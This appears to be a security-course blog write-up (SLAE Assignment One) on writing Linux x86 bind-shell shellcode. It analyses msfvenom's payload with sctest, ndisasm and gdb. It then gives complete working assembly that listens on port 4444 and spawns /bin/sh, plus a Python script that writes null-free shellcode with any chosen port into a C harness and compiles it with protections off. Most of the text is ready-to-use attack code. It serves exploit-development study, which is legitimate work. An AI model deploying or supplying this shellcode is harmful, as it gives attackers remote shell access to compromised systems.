### Assignment One:

1. Creating Shellcode to Bind a Shell Over TCP
    - Binds to a port
    - Execs Shell on incoming connection
2. Port number should be easily configurable

In this assignment, we are going to create our own bind shell shellcode. To understand how this is going to work, we can take the one in msfvenom as example.

```
msfvenom -p linux/x86/shell_bind_tcp -f raw | sctest -vvv -Ss 10000
```
We will get a lot of output but the following part interests me

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex1-1.JPG"/>

Here, the shellcode will try to create a socket and bind port 4444 (msfvenom default port) which is exactly the part that we would like to enhance. However, it didn't really tell us what kind of value is being pushed to the stack. It will be better for us to understand it from the assembly level with the help of ndisasm.

```
msfvenom -p linux/x86/shell_bind_tcp -f raw |ndisasm -u -
```
<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex1-2.JPG"/>

We can see that several hex values are being pushed to the stack. We can use xxd to help us to convert them back to ascii.
Remember since x86 uses little endian, its better for use to reverse the order first.

The first one doesn't look right to us while the second one is use to call /bin/sh for execve so we do not need to modify it. 
Lets examine what systemcall it is trying to use after the value '0200115C' being pushed into the stack.
The hex number 0x66 is being used which is equals to 102 in decimal value. Referring to /usr/include/i386-linux-gnu/asm/unistd_32.h, it is actually trying to use socketcall.
According to man socketcall, we know that there are different type of socket call and they all are defined as different number and being used as the first argument (Which will be ebx). These calls are defined inside /usr/include/linux/net.h

```c
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)		*/
#define SYS_GETPEERNAME	7		/* sys_getpeername(2)		*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
#define SYS_SEND	9		/* sys_send(2)			*/
#define SYS_RECV	10		/* sys_recv(2)			*/
#define SYS_SENDTO	11		/* sys_sendto(2)		*/
#define SYS_RECVFROM	12		/* sys_recvfrom(2)		*/
#define SYS_SHUTDOWN	13		/* sys_shutdown(2)		*/
#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)		*/
#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)		*/
#define SYS_SENDMSG	16		/* sys_sendmsg(2)		*/
#define SYS_RECVMSG	17		/* sys_recvmsg(2)		*/
#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/
#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)		*/
#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)		*/
```

Lets use gdb to examine the value of ebx of that systemcall.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex1-4.JPG"/>

0x2 (SYS_BIND) is assigned to ebx before socketcall is called again. As an additional reference, ebx is set to 0x1,0x2,0x4,0x5 along the shellcode which matches our findings in Libemu.
As now we understand that the value 0x2 equals to bind(), the struture of socketcall for bind should look like this
```c
socketcall( 0x2, bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen));
```
According to the shellcode from msfvenom, the rest of the arguments should by pointed by ecx, again, we can use gdb to study the values

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex1-5.JPG"/>

With these value, we can fill in values on our own
```c
socketcall( 0x2, bind(0x3, 0xbffff324, 0x10));
```
Since 0xbffff324 is the address pointed to the value of sockaddr = 0200115C, according to man bind()
```c
    struct sockaddr {
        sa_family_t sa_family;
        char        sa_data[14];
    }
```
How this sockaddr work is that we need to assign a value for sa_family which is usually 0x2 while the sa_data[14] will be in a port+ip address format.
Since we didn't specify the ip address, the value will be 0x0 and port 4444 in hex will be 115C.

Up till now, it is really obvious that we can just copy the shellcode from msfvenon, convert our desire port to hexadecimal and reverse it to configure our bind shell. However, what's the point of learning if we just use this existing shellcode? Also, this shellcode contains a null byte which we do not want, as such, we are going to write our own bind shell shellcode.

### Bind Shell Proof of Concept:
```asm
global _start

section .text

_start:
;First, we will need to create a socket		
;
;  socketcall(int call, socket(int domain, int type, int protocol)
;  eax:		ebx:    			ecx:
;  0x66		call = 0x1 (SYS_SOCKET)		*args = {domain = 0x2 (AF_INET), type = 0x1 (SOCK_STREAM), protocol = 0x0 (Single Protocol)}
;	
	xor ebx,ebx	; init register
	xor eax,eax
	xor edx,edx
	push ebx	; 0x0 for protocol
	inc ebx		
	push ebx	; 0x1 for SOCK_STREAM
	push byte +0x2	; 0x2 for AF_INET
	mov ecx,esp	; ecx points to addr of current stack
	mov al,0x66	; 0x66 systemcall for socketcall
	int 0x80
;Then we will need to set up bind() to assign address, listen() to listen for connection and accept() to accept connection
;
;  socketcall(int call, bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen))
;  eax:		ebx:				ecx:
;  0x66		call = 0x2 (SYS_BIND)		*args = {sockfd = eax, sockaddr = [0x2 (AF_INET), port = 115C (4444), address = 0x0], addrlen = 0x10}
;
	pop ebx
	pop esi
	push edx	; We just set our address to 0x0 so that it will accept all traffic.
			; You can also specify the address, e.g. 192.168.1.1 = C0.A8.01.01 = push dword 0101A8C0
	push word 0x5c11; 115c is 4444 in hexadecimal form
	push word 0x02	; value for AF_INET
	push byte +0x10
	push ecx	; push the address that store value of sockaddr to stack
	push eax	; eax was set to the value of sockfd after the socket call 
	mov ecx,esp	; ecx points to addr of current stack
	push byte +0x66 ; 0x66 systemcall for socketcall
	pop eax
	int 0x80
;
;  socketcall(int call, listen(int sockfd, int backlog))
;  eax:		ebx:				ecx:
;  0x66		call = 0x4 (SYS_LISTEN)		sockfd = eax
;
	mov [ecx+0x4],eax	; modify the the stack ecx is pointing to to sockfd
	mov bl,0x4		; socket call for listen
	mov al,0x66		; 0x66 systemcall for socketcall
	int 0x80
;
;  socketcall(int call, accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen))
;
	inc ebx			;increase ebx to 0x5 to call accept
	mov al,0x66		; 0x66 systemcall for socketcall
	int 0x80
;Now, its time for us to redirect all file descriptor we need so that our input and output to the shell 
;will be handled by stdin(0), stdout(1) and stderr(2)
;
;  dup2(int oldfd, int newfd, int flags)
;  eax:		ebx:			ecx:
;  0x3f		oldfd = sockfd		newfd = stdin(0), stdout(1) and stderr(2)
;
	xchg eax,ebx
	pop ecx
	mov cl, 0x2
loop:				; Since we got three fd, we will use loop 3 times
	mov al, 0x3f		; 0x3f systemcall for dup2
	int 0x80
	dec ecx			; 2 > 1 > 0
	jns loop
;At last, the final part, this one is rather easy as we only need to call /bin/sh with execve()
;
;  execve(const char *filename, char *const argv[],char *const envp[])
;  eax:		ebx:			ecx:			edx:
;  0xb		*filename = /bin//sh	address of /bin//sh	0x0
	push dword 0x68732f2f
	push dword 0x6e69622f	; /bin//sh
	mov ebx,esp
	push eax		; eax was set to 0x0 after dup2 and we can use it directly
	push ebx		
	mov ecx,esp
	mov al,0xb		; 0xb systemcall for execve
	int 0x80
```

After we compile it, it is running flawlessly in our Kali on port 4444.

Since, one of the requirement of this exercise is that we can configure the port of our bind shell easily, to do so, I have created a python script to generate the shellcode.
This python will create a new BindShell-<Port>.c file with the customized shellcode inside and compile it with gcc.

### Bind Shell shellcode generator:
```python
import sys
import os
import getopt

def usage():
	print('BindShellCode.py -p port | -h help')	

def main(argv):
	port = 0
	if(len(sys.argv) < 2):
		usage()
		sys.exit()
	try:
		opts,args = getopt.getopt(argv, "hp:", ['port='])
	except getopt.GetoptError:
		usage()
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit()
		elif opt in ("-p", "--port"):
			port = int(arg)
			if port < 1 or port > 65535:
				print('Error port!')
				sys.exit(2)
			if port > 0 and port < 1025:
				print('You need root to use this port')
			print('Port: ' + str(port))
	hexPort = str(hex(port))[2::]
	if len(hexPort) <4:
		hexPort = '0'+hexPort
	print('Port in hex: ' + hexPort)
	hexPort = "\\x" + hexPort[0:2] + "\\x" + hexPort[2:]
	Shellcode = "\\x31\\xdb\\x31\\xc0\\x31\\xd2\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b"
	Shellcode +="\\x5e\\x52\\x66\\x68" + hexPort + "\\x66\\x6a\\x02\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd"
	Shellcode +="\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb1\\x02" 
	Shellcode +="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" 
	Shellcode +="\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
	
	print("Shellcode:")
	print(Shellcode)

	filename="BindShell-" + str(port) + ".c"
	print("Saving to " + filename)
 
	content = "#include<stdio.h>\n"
	content += "#include<string.h>\n"
	content += "unsigned char code[] = \\\n"
	content += "\"" + Shellcode + "\";\n"
	content += "int main(){\n"
	content += "	printf(\"Shellcode Length:  %d\\n\", strlen(code));\n"
	content += "	int (*ret)() = (int(*)())code;\n"
	content += "	ret();}\n"
  
	textfile = open(filename , 'w')
	textfile.write(content)
	textfile.close()

	os.system("gcc -m32 -fno-stack-protector -z execstack " + filename +" -o " + filename[:-2])

if __name__ == '__main__':
	main(sys.argv[1:])
```

Looks great
